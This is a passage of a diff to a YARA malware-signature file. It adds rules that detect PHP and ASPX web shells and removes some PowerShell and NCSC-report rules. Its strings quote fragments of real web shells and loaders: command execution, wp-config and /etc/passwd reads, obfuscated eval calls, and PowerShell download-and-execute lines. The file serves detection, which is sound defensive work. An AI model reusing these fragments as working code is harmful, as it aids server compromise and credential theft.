+		uint32(0) == 0x68703f3c and all of ($s*) and filesize > 570 and filesize < 800
+}
+
+rule WEBSHELL_H4ntu_Shell_Powered_Tsoi_3 {
+   meta:
+      description = "Web Shell - file h4ntu shell powered by tsoi.php"
+      author = "Florian Roth"
+      date = "2014-01-28"
+      modified = "2025-03-21"
+      score = 70
+      old_rule_name = "Webshell_h4ntu_shell_powered_by_tsoi_"
+      hash = "06ed0b2398f8096f1bebf092d0526137"
+   strings:
+      $s0 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b"
+      $s3 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui"
+      $s4 = "    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= "
+   condition:
+      2 of them
+}
+
+rule WEBSHELL_H4ntu_Shell_Powered_Tsoi {
+   meta:
+      description = "Semi-Auto-generated - file h4ntu shell [powered by tsoi].txt"
+      author = "Florian Roth"
+      date = "2014-03-29"
+      modified = "2025-03-21"
+      score = 80
+      old_rule_name = "Webshell_h4ntu_shell__powered_by_tsoi_"
+      hash = "06ed0b2398f8096f1bebf092d0526137"
+   strings:
+      $x1 = "<title>h4ntu shell"
+      $x2 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");"
+   condition:
+      filesize < 100KB
+      and 1 of them
+}
+
+rule webshell_webshell_123 {
+	meta:
+		description = "Web shells - generated from file webshell-123.php"
+		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+		author = "Florian Roth (Nextron Systems)"
+		date = "2014-03-28"
+		modified = "2023-01-27"
+		score = 70
+		hash = "2782bb170acaed3829ea9a04f0ac7218"
+		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
+	strings:
+		$s0 = "// Web Shell!!" fullword
+		$s1 = "@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6"
+		$s3 = "$default_charset = \"UTF-8\";" fullword
+		$s4 = "// url:http://www.weigongkai.com/shell/"
+	condition:
+		2 of them
+}
+
+rule WEBSHELL_H4ntu_Shell_Powered_Tsoi_2 {
+   meta:
+      description = "PHP Webshells Github Archive - file h4ntu shell [powered by tsoi].php"
+      author = "Florian Roth"
+      date = "2014-04-06"
+      modified = "2025-03-21"
+      old_rule_name = "WebShell_h4ntu_shell__powered_by_tsoi_"
+      hash = "cbca8cd000e705357e2a7e0cf8262678706f18f9"
+   strings:
+      $s1 = "<title>h4ntu shell [powered by tsoi]</title>" fullword
+      $s2 = "$uname = posix_uname( );" fullword
+      $s3 = "if(!$whoami)$whoami=exec(\"whoami\");" fullword
+      $s4 = "echo \"<p><font size=2 face=Verdana><b>This Is The Server Information</b></font>"
+   condition:
+      filesize <2MB and 2 of them
+}
+
+rule Webshell_Backdoor_PHP_Agent_r57_mod_bizzz_shell_r57 {
+	meta:
+		description = "Detects Webshell - rule generated from from files Backdoor.PHP.Agent.php, r57.mod-bizzz.shell.txt ..."
+		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+		author = "Florian Roth (Nextron Systems)"
+		reference = "https://github.com/nikicat/web-malware-collection"
+		date = "2016-01-11"
+		score = 70
+		hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
+		hash2 = "f51a5c5775d9cca0b137ddb28ff3831f4f394b7af6f6a868797b0df3dcdb01ba"
+		hash3 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
+		hash4 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
+		hash5 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
+		hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
+		hash7 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
+		hash8 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
+		hash9 = "59ea6cf16ea06ff47cf0e6a398df2eaec4d329707b8c3201fc63cbf0b7c85519"
+		hash10 = "0e0227a0001b38fb59fc07749e80c9d298ff0e6aca126ea8f4ea68ebc9a3661f"
+		hash11 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
+		id = "00d3159c-f5d2-5b49-9499-3bb938776858"
+	strings:
+		$s1 = "$_POST['cmd'] = which('" ascii
+		$s2 = "$blah = ex(" ascii
+	condition:
+		filesize < 600KB and all of them
+}
+
+rule UploadShell_98038f1efa4203432349badabad76d44337319a6 {
+	meta:
+		description = "Detects a web shell"
+		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+		author = "Florian Roth (Nextron Systems)"
+		reference = "https://github.com/bartblaze/PHP-backdoors"
+		date = "2016-09-10"
+		hash1 = "506a6ab6c49e904b4adc1f969c91e4f1a7dde164be549c6440e766de36c93215"
+		id = "f385b091-ce0d-5d5b-8eeb-57e00c8d0210"
+	strings:
+		$s2 = "$lol = file_get_contents(\"../../../../../wp-config.php\");" fullword ascii
+		$s6 = "@unlink(\"./export-check-settings.php\");" fullword ascii
+		$s7 = "$xos = \"Safe-mode:[Safe-mode:\".$hsafemode.\"] " fullword ascii
+	condition:
+		( uint16(0) == 0x3f3c and filesize < 6KB and ( all of ($s*) ) ) or ( all of them )
+}
+
+rule DKShell_f0772be3c95802a2d1e7a4a3f5a45dcdef6997f3 {
+	meta:
+		description = "Detects a web shell"
+		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+		author = "Florian Roth (Nextron Systems)"
+		reference = "https://github.com/bartblaze/PHP-backdoors"
+		date = "2016-09-10"
+		hash1 = "7ea49d5c29f1242f81f2393b514798ff7caccb50d46c60bdfcf61db00043473b"
+		id = "161ceca6-f5e8-5bcf-bc31-2a2169b1a1c7"
+	strings:
+		$s1 = "<?php Error_Reporting(0); $s_pass = \"" ascii
+		$s2 = "$s_func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on" ascii
+	condition:
+		( uint16(0) == 0x3c0a and filesize < 300KB and all of them )
+}
+
+rule Unknown_8af033424f9590a15472a23cc3236e68070b952e {
+	meta:
+		description = "Detects a web shell"
+		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+		author = "Florian Roth (Nextron Systems)"
+		reference = "https://github.com/bartblaze/PHP-backdoors"
+		date = "2016-09-10"
+		hash1 = "3382b5eaaa9ad651ab4793e807032650667f9d64356676a16ae3e9b02740ccf3"
+		id = "fcf467b6-f49a-52d0-a57f-9f3cf6d0b25b"
+	strings:
+		$s1 = "$check = $_SERVER['DOCUMENT_ROOT']" fullword ascii
+		$s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
+		$s3 = "fwrite($fp,base64_decode('" ascii
+	condition:
+		( uint16(0) == 0x6324 and filesize < 6KB and ( all of ($s*) ) ) or ( all of them )
+}
+
+rule DkShell_4000bd83451f0d8501a9dfad60dce39e55ae167d {
+	meta:
+		description = "Detects a web shell"
+		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+		author = "Florian Roth (Nextron Systems)"
+		reference = "https://github.com/bartblaze/PHP-backdoors"
+		date = "2016-09-10"
+		hash1 = "51a16b09520a3e063adf10ff5192015729a5de1add8341a43da5326e626315bd"
+		id = "804f7229-1440-5a2e-91cd-a58a38b22aa9"
+	strings:
+		$x1 = "DK Shell - Took the Best made it Better..!!" fullword ascii
+		$x2 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
+		$x3 = "echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';" fullword ascii
+
+		$s1 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
+		$s9 = "$x = $_GET[\"x\"];" fullword ascii
+	condition:
+		( uint16(0) == 0x3f3c and filesize < 200KB and 1 of ($x*) ) or ( 3 of them )
+}
+
+rule webshell_e8eaf8da94012e866e51547cd63bb996379690bf {
+	meta:
+		description = "Detects a web shell"
+		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+		author = "Florian Roth (Nextron Systems)"
+		reference = "https://github.com/bartblaze/PHP-backdoors"
+		date = "2016-09-10"
+		hash1 = "027544baa10259939780e97dc908bd43f0fb940510119fc4cce0883f3dd88275"
+		id = "8fda9b9f-9a72-5123-91d7-0d0aec9e17bc"
+	strings:
+		$x1 = "@exec('./bypass/ln -s /etc/passwd 1.php');" fullword ascii
+		$x2 = "echo \"<iframe src=mysqldumper/index.php width=100% height=100% frameborder=0></iframe> \";" fullword ascii
+		$x3 = "@exec('tar -xvf mysqldumper.tar.gz');" fullword ascii
+	condition:
+		( uint16(0) == 0x213c and filesize < 100KB and 1 of ($x*) ) or ( 2 of them )
+}
+
+rule Unknown_0f06c5d1b32f4994c3b3abf8bb76d5468f105167 {
+	meta:
+		description = "Detects a web shell"
+		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+		author = "Florian Roth (Nextron Systems)"
+		reference = "https://github.com/bartblaze/PHP-backdoors"
+		date = "2016-09-10"
+		hash1 = "6362372850ac7455fa9461ed0483032a1886543f213a431f81a2ac76d383b47e"
+		id = "efd09da2-f232-5a21-99c8-dc2bf00baa73"
+	strings:
+		$s1 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/libraries/lola.php\" ;" fullword ascii
+		$s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
+		$s3 = "fwrite($fp,base64_decode('" ascii
+	condition:
+		( uint16(0) == 0x6324 and filesize < 2KB and all of them )
+}
+
+rule WSOShell_0bbebaf46f87718caba581163d4beed56ddf73a7 {
+	meta:
+		description = "Detects a web shell"
+		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+		author = "Florian Roth (Nextron Systems)"
+		reference = "https://github.com/bartblaze/PHP-backdoors"
+		date = "2016-09-10"
+		hash1 = "d053086907aed21fbb6019bf9e644d2bae61c63563c4c3b948d755db3e78f395"
+		id = "92165645-5392-588d-ba2a-5ef6b7499a5a"
+	strings:
+		$s8 = "$default_charset='Wi'.'ndo.'.'ws-12'.'51';" fullword ascii
+		$s9 = "$mosimage_session = \"" fullword ascii
+	condition:
+		( uint16(0) == 0x3f3c and filesize < 300KB and all of them )
+}
+
+rule WebShell_Generic_1609_A {
+	meta:
+		description = "Auto-generated rule"
+		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+		author = "Florian Roth (Nextron Systems)"
+		reference = "https://github.com/bartblaze/PHP-backdoors"
+		date = "2016-09-10"
+		super_rule = 1
+		hash1 = "c817a490cfd4d6377c15c9ac9bcfa136f4a45ff5b40c74f15216c030f657d035"
+		hash3 = "69b9d55ea2eb4a0d9cfe3b21b0c112c31ea197d1cb00493d1dddc78b90c5745e"
+		id = "4b7db4db-8699-5b4d-ab90-ce79f1160984"
+	strings:
+		$s1 = "return $qwery45234dws($b);" fullword ascii
+	condition:
+		( uint16(0) == 0x3f3c and 1 of them )
+}
+
+rule PHP_Webshell_1_Feb17 {
+   meta:
+      description = "Detects a simple cloaked PHP web shell"
+      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+      author = "Florian Roth (Nextron Systems)"
+      reference = "https://isc.sans.edu/diary/Analysis+of+a+Simple+PHP+Backdoor/22127"
+      date = "2017-02-28"
+      id = "eedf87c9-2dab-530d-b5d8-a4c2ebc87821"
+   strings:
+      $h1 = "<?php ${\"\\x" ascii
+
+      $x1 = "\";global$auth;function sh_decrypt_phase($data,$key){${\"" ascii
+      $x2 = "global$auth;return sh_decrypt_phase(sh_decrypt_phase($" ascii
+      $x3 = "]}[\"\x64\"]);}}echo " ascii
+      $x4 = "\"=>@phpversion(),\"\\x" ascii
+
+      /* Decloaked version */
+      $s1 = "$i=Array(\"pv\"=>@phpversion(),\"sv\"" ascii
+      $s3 = "$data = @unserialize(sh_decrypt(@base64_decode($data),$data_key));" ascii
+   condition:
+      uint32(0) == 0x68703f3c and ( $h1 at 0 and 1 of them ) or 2 of them
+}
+
+rule ALFA_SHELL {
+   meta:
+      description = "Detects web shell often used by Iranian APT groups"
+      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+      author = "Florian Roth (Nextron Systems)"
+      reference = "Internal Research - APT33"
+      date = "2017-09-21"
+      hash1 = "a39d8823d54c55e60a7395772e50d116408804c1a5368391a1e5871dbdc83547"
+      id = "f0be44ec-bff0-5d01-aabd-df7aa05383e3"
+   strings:
+      $x1 = "$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64')" ascii
+      $x2 = "#solevisible@gmail.com" fullword ascii
+      $x3 = "'login_page' => '500',//gui or 500 or 403 or 404" fullword ascii
+      $x4 = "$GLOBALS['__ALFA__']" fullword ascii
+      $x5 = "if(!function_exists('b'.'as'.'e6'.'4_'.'en'.'co'.'de')" ascii
+      $f1 = { 76 2F 38 76 2F 36 76 2F 2B 76 2F 2F 66 38 46 27 29 3B 3F 3E 0D 0A }
+   condition:
+      ( filesize < 900KB and 2 of ($x*) or $f1 at (filesize-22) )
+}
+
+rule Webshell_FOPO_Obfuscation_APT_ON_Nov17_1 {
+   meta:
+      description = "Detects malware from NK APT incident DE"
+      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+      author = "Florian Roth (Nextron Systems)"
+      reference = "Internal Research - ON"
+      date = "2017-11-17"
+      hash1 = "ed6e2e0027d3f564f5ce438984dc8a54577df822ce56ce079c60c99a91d5ffb1"
+      id = "0122bb03-8ff0-554d-8fee-458f0ddd7664"
+   strings:
+      $x1 = "Obfuscation provided by FOPO" fullword ascii
+
+      $s1 = "\";@eval($" ascii
+      $f1 = { 22 29 29 3B 0D 0A 3F 3E }
+   condition:
+      uint16(0) == 0x3f3c and filesize < 800KB and (
+        $x1 or
+        ( $s1 in (0..350) and $f1 at (filesize-23) )
+      )
+}
+
+rule webshell_tinyasp {
+    meta:
+	author = "Jeff Beley"
+	hash1 = "1f29905348e136b66d4ff6c1494d6008ea13f9551ad5aa9b991893a31b37e452"
+	description = "Detects 24 byte ASP webshell and variations"
+	date = "2019-01-09"
+	id = "38b1f61b-e506-59b2-9157-d0345431c429"
+   strings:
+   	$s1 = "Execute Request" ascii wide nocase
+   condition:
+   	uint16(0) == 0x253c and filesize < 150 and 1 of them
+}
+
+rule WEBSHELL_ASPX_Mar21_1 {
+   meta:
+      description = "Detects ASPX Web Shells"
+      author = "Florian Roth (Nextron Systems)"
+      reference = "Internal Research"
+      date = "2021-03-12"
+      hash1 = "10b6e82125a2ddf3cc31a238e0d0c71a64f902e0d77171766713affede03174d"
+      hash2 = "170bee832df176aac0a3c6c7d5aa3fee413b4572030a24c994a97e70f6648ffc"
+      hash3 = "31c4d1fc81c052e269866deff324dffb215e7d481a47a2b6357a572a3e685d90"
+      hash4 = "41b5c26ac194439612b68e9ec6a638eceaf00842c347ffa551eb009ef6c015a3"
+      hash5 = "4b645bc773acde2b3cc204e77ac27c3f6991046c3b75f42d12bc90ec29cff9e3"
+      hash6 = "602bb701b78895d4de32f5e78f3c511e5298ba244b29641b11a7c1c483789859"
+      hash7 = "7ac47a17c511e25c06a53a1c7a5fbbf05f41f047a4a40b71afa81ce7b59f4b03"
+      hash8 = "9a5097d0e8dc29a2814adac070c80fd4b149b33e56aaaf9235af9e87b0501d91"
+      hash9 = "9efb5932c0753e45504fc9e8444209b92c2bdf22e63b1c1a44e2d52cb62b4548"
+      hash10 = "d40b16307d6434c3281374c0e1bbc0f6db388883e7f6266c3c81de0694266882"
+      id = "52884135-6b86-5e3e-a866-36a812d5a9af"
+   strings:
+      $s1 = ".StartInfo.FileName = 'cmd.exe';" ascii fullword
+      $s2 = "<xsl:template match=\"\"/root\"\">" ascii fullword
+      $s3 = "<?xml version=\"\"1.0\"\"?><root>test</root>\";" ascii fullword
+   condition:
+      uint16(0) == 0x253c and
+      filesize < 6KB and
+      all of them
 }
 
 rule SUSP_ZIP_ISO_PhishAttachment_Pattern_Jun22_1 {
@@ -11675,66 +16810,6 @@ rule generic_shellcode_downloader_specific {
     (uint16(0) == 0x5A4D and uint16(uint32(0x3C)) == 0x4550) and ($a or $b) and @push1 < @push2 and @push2 < @push3
 }
 
-rule Batch_Powershell_Invoke_Inveigh {
-   meta:
-      author = "NCSC"
-      description = "Detects malicious batch file from NCSC report"
-      reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
-      date = "2018/04/06"
-      hash = "0a6b1b29496d4514f6485e78680ec4cd0296ef4d21862d8bf363900a4f8e3fd2"
-      id = "c5dab029-6515-5d58-9ccd-bf438ba692d5"
-   strings:
-      $ = "Inveigh.ps1" ascii
-      $ = "Invoke-Inveigh" ascii
-      $ = "-LLMNR N -HTTP N -FileOutput Y" ascii
-      $ = "powershell.exe" ascii
-   condition:
-      all of them
-}
-
-rule RDP_Brute_Strings {
-   meta:
-      author = "NCSC"
-      description = "Detects RDP brute forcer from NCSC report"
-      reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
-      date = "2018/04/06"
-      hash = "8234bf8a1b53efd2a452780a69666d1aedcec9eb1bb714769283ccc2c2bdcc65"
-      id = "d6f0cdbc-a910-5826-b25a-61c2924f8e2a"
-   strings:
-      $ = "RDP Brute" ascii wide
-      $ = "RdpChecker" ascii
-      $ = "RdpBrute" ascii
-      $ = "Brute_Count_Password" ascii
-      $ = "BruteIPList" ascii
-      $ = "Chilkat_Socket_Key" ascii
-      $ = "Brute_Sync_Stat" ascii
-      $ = "(Error! Hyperlink reference not valid.)" wide
-      $ = "BadRDP" wide
-      $ = "GoodRDP" wide
-      $ = "@echo off{0}:loop{0}del {1}{0}if exist {1} goto loop{0}del {2}{0}del \"{2}\"" wide
-      $ = "Coded by z668" wide
-   condition:
-      4 of them
-}
-
-rule WEBSHELL_Z_WebShell_1 {
-   meta:
-      author = "NCSC"
-      description = "Detects Z Webshell from NCSC report"
-      reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
-      date = "2018/04/06"
-      old_rule_name = "Z_WebShell"
-      hash = "ace12552f3a980f1eed4cadb02afe1bfb851cafc8e58fb130e1329719a07dbf0"
-      id = "f4b50760-bd3a-5e1f-bf32-50f16a42c381"
-   strings:
-      $ = "Z_PostBackJS" ascii wide
-      $ = "z_file_download" ascii wide
-      $ = "z_WebShell" ascii wide
-      $ = "1367948c7859d6533226042549228228" ascii wide
-   condition:
-      3 of them
-}
-
 rule WEBSHELL_ASPX_MOVEit_Jun23_1 {
    meta:
       description = "Detects ASPX web shells as being used in MOVEit Transfer exploitation"
@@ -11794,64 +16869,6 @@ rule Suspicious_PowerShell_Code_1 : FILE {
 		$s6 = "powershell.exe reg add HKCU\\software\\microsoft\\windows\\currentversion\\run" nocase
    condition:
       1 of them
-}
-
-rule Suspicious_PowerShell_WebDownload_1 : HIGHVOL FILE {
-   meta:
-      description = "Detects suspicious PowerShell code that downloads from web sites"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      score = 60
-      reference = "Internal Research"
-      date = "2017-02-22"
-      modified = "2024-04-03"
-      nodeepdive = 1
-      id = "a763fb82-c840-531b-b631-f282bf035020"
-   strings:
-      $s1 = "System.Net.WebClient).DownloadString(\"http" ascii nocase
-      $s2 = "System.Net.WebClient).DownloadString('http" ascii nocase
-      $s3 = "system.net.webclient).downloadfile('http" ascii nocase
-      $s4 = "system.net.webclient).downloadfile(\"http" ascii nocase
-      $s5 = "GetString([Convert]::FromBase64String(" ascii nocase
-
-      $fp1 = "NuGet.exe" ascii fullword
-      $fp2 = "chocolatey.org" ascii
-      $fp3 = " GET /"
-      $fp4 = " POST /"
-      $fp5 = ".DownloadFile('https://aka.ms/installazurecliwindows', 'AzureCLI.msi')" ascii
-      $fp6 = " 404 " /* in web server logs */
-      $fp7 = "# RemoteSSHConfigurationScript" ascii /* \.vscode\extensions\ms-vscode-remote.remote-ssh */
-      $fp8 = "<helpItems" ascii fullword
-      $fp9 = "DownloadFile(\"https://codecov.io/bash" ascii
-      $fp10 = "DownloadFile('https://get.golang.org/installer.exe" ascii
-
-      $fpg1 = "All Rights"
-      $fpg2 = "<html"
-      $fpg3 = "<HTML"
-      $fpg4 = "Copyright"
-      $fpg5 = "License"
-      $fpg6 = "<?xml"
-      $fpg7 = "Help" fullword
-      $fpg8 = "COPYRIGHT" fullword
-   condition:
-      1 of ($s*) and not 1 of ($fp*)
-}
-
-rule PowerShell_in_Word_Doc {
-   meta:
-      description = "Detects a powershell and bypass keyword in a Word document"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "Internal Research - ME"
-      date = "2017-06-27"
-      score = 50
-      hash1 = "4fd4a7b5ef5443e939015276fc4bf8ffa6cf682dd95845ef10fdf8158fdd8905"
-      id = "c9d073ff-25c6-5751-92bf-e22ae7cfd5f5"
-   strings:
-      $s1 = "POwErSHELl.ExE" fullword ascii nocase
-      $s2 = "BYPASS" fullword ascii nocase
-   condition:
-      ( uint16(0) == 0xcfd0 and filesize < 1000KB and all of them )
 }
 
 rule Susp_PowerShell_Sep17_1 {
@@ -11956,59 +16973,6 @@ rule PowerShell_JAB_B64 {
       filesize < 30KB and all of them
 }
 
-rule SUSP_PS1_FromBase64String_Content_Indicator : FILE {
-   meta:
-      description = "Detects suspicious base64 encoded PowerShell expressions"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639"
-      date = "2020-01-25"
-      id = "326c83ff-5d21-508f-b935-03ccdab6efa7"
-   strings:
-      $ = "::FromBase64String(\"H4s" ascii wide
-      $ = "::FromBase64String(\"TVq" ascii wide
-      $ = "::FromBase64String(\"UEs" ascii wide
-      $ = "::FromBase64String(\"JAB" ascii wide
-      $ = "::FromBase64String(\"SUVY" ascii wide
-      $ = "::FromBase64String(\"SQBFAF" ascii wide
-      $ = "::FromBase64String(\"SQBuAH" ascii wide
-      $ = "::FromBase64String(\"PAA" ascii wide
-      $ = "::FromBase64String(\"cwBhA" ascii wide
-      $ = "::FromBase64String(\"aWV4" ascii wide
-      $ = "::FromBase64String(\"aQBlA" ascii wide
-      $ = "::FromBase64String(\"R2V0" ascii wide
-      $ = "::FromBase64String(\"dmFy" ascii wide
-      $ = "::FromBase64String(\"dgBhA" ascii wide
-      $ = "::FromBase64String(\"dXNpbm" ascii wide
-      $ = "::FromBase64String(\"H4sIA" ascii wide
-      $ = "::FromBase64String(\"Y21k" ascii wide
-      $ = "::FromBase64String(\"Qzpc" ascii wide
-      $ = "::FromBase64String(\"Yzpc" ascii wide
-      $ = "::FromBase64String(\"IAB" ascii wide
-
-      $ = "::FromBase64String('H4s" ascii wide
-      $ = "::FromBase64String('TVq" ascii wide
-      $ = "::FromBase64String('UEs" ascii wide
-      $ = "::FromBase64String('JAB" ascii wide
-      $ = "::FromBase64String('SUVY" ascii wide
-      $ = "::FromBase64String('SQBFAF" ascii wide
-      $ = "::FromBase64String('SQBuAH" ascii wide
-      $ = "::FromBase64String('PAA" ascii wide
-      $ = "::FromBase64String('cwBhA" ascii wide
-      $ = "::FromBase64String('aWV4" ascii wide
-      $ = "::FromBase64String('aQBlA" ascii wide
-      $ = "::FromBase64String('R2V0" ascii wide
-      $ = "::FromBase64String('dmFy" ascii wide
-      $ = "::FromBase64String('dgBhA" ascii wide
-      $ = "::FromBase64String('dXNpbm" ascii wide
-      $ = "::FromBase64String('H4sIA" ascii wide
-      $ = "::FromBase64String('Y21k" ascii wide
-      $ = "::FromBase64String('Qzpc" ascii wide
-      $ = "::FromBase64String('Yzpc" ascii wide
-      $ = "::FromBase64String('IAB" ascii wide
-   condition:
-      filesize < 5000KB and 1 of them
-}
-
 rule PowerShell_Case_Anomaly {
    meta:
       description = "Detects obfuscated PowerShell hacktools"
@@ -12082,28 +17046,6 @@ rule WScriptShell_Case_Anomaly {
    condition:
       filesize < 3000KB and
       #s1 > #sn1 + #sn2 + #sn3 + #sn4 + #sn5
-}
-
-rule Beacon_K5om {
-   meta:
-      description = "Detects Meterpreter Beacon - file K5om.dll"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
-      date = "2017-06-07"
-      hash1 = "e3494fd2cc7e9e02cff76841630892e4baed34a3e1ef2b9ae4e2608f9a4d7be9"
-      id = "9354d20a-d798-55bf-a735-820f21d4a861"
-   strings:
-      $x1 = "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s" fullword ascii
-      $x2 = "powershell -nop -exec bypass -EncodedCommand \"%s\"" fullword ascii
-      $x3 = "%d is an x86 process (can't inject x64 content)" fullword ascii
-
-      $s1 = "Could not open process token: %d (%u)" fullword ascii
-      $s2 = "0fd00b.dll" fullword ascii
-      $s3 = "%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s" fullword ascii
-      $s4 = "Could not connect to pipe (%s): %d" fullword ascii
-   condition:
-      ( uint16(0) == 0x5a4d and filesize < 600KB and ( 1 of ($x*) or 3 of them ) )
 }
 
 rule FE_LEGALSTRIKE_MACRO {
@@ -12379,6 +17321,20 @@ rule SUSP_certificate_payload {
       and not 1 of ($fp*)
 }
 
+rule HKTL_CobaltStrike_Beacon_4_2_Decrypt {
+   meta:
+      author = "Elastic"
+      description = "Identifies deobfuscation routine used in Cobalt Strike Beacon DLL version 4.2"
+      reference = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
+      date = "2021-03-16"
+      id = "63b71eef-0af5-5765-b957-ccdc9dde053b"
+   strings:
+      $a_x64 = {4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03}
+      $a_x86 = {8B 46 04 8B 08 8B 50 04 83 C0 08 89 55 08 89 45 0C 85 C9 75 04 85 D2 74 23 3B CA 73 E6 8B 06 8D 3C 08 33 D2}
+   condition:
+      any of them
+}
+
 rule TA17_293A_malware_1 {
     meta:
         description = "inveigh pen testing tools & related artifacts"
@@ -12440,44 +17396,6 @@ rule TA17_293A_malware_1 {
         ( $n1 and 1 of ($ax*) ) or
         2 of ($s*) or
         1 of ($x*)
-}
-
-rule TA17_293A_Query_Javascript_Decode_Function {
-    meta:
-        name= "Query_Javascript_Decode_Function"
-        author = "other (modified by Florian Roth)"
-        reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
-        id = "bc206ab3-a86b-5abe-ae84-15abab838d4e"
-    strings:
-        $decode1 = {72 65 70 6C 61 63 65 28 2F 5B 5E 41 2D 5A 61 2D 7A 30 2D 39 5C 2B 5C 2F 5C 3D 5D 2F 67 2C 22 22 29 3B}
-        $decode2 = {22 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A 30 31 32 33 34 35 36 37 38 39 2B 2F 3D 22 2E 69 6E 64 65 78 4F 66 28 ?? 2E 63 68 61 72 41 74 28 ?? 2B 2B 29 29}
-        $decode3 = {3D ?? 3C 3C 32 7C ?? 3E 3E 34 2C ?? 3D 28 ?? 26 31 35 29 3C 3C 34 7C ?? 3E 3E 32 2C ?? 3D 28 ?? 26 33 29 3C 3C 36 7C ?? 2C ?? 2B 3D [1-2] 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29 2C 36 34 21 3D ?? 26 26 28 ?? 2B 3D 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29}
-        $decode4 = {73 75 62 73 74 72 69 6E 67 28 34 2C ?? 2E 6C 65 6E 67 74 68 29}
-        /* Only 3 characters atom - this is bad for performance - we're trying to leave this out
-        $func_call="a(\""
-        */
-    condition:
-        filesize < 20KB and
-        /* #func_call > 20 and */
-        all of ($decode*)
-}
-
-rule TA17_293A_Hacktool_Exploit_MS16_032 {
-   meta:
-      description = "Auto-generated rule"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
-      date = "2017-10-21"
-      hash1 = "9b97290300abb68fb48480718e6318ee2cdd4f099aa6438010fb2f44803e0b58"
-      id = "4c5838d7-9956-564e-a25c-f2ba5641ac03"
-   strings:
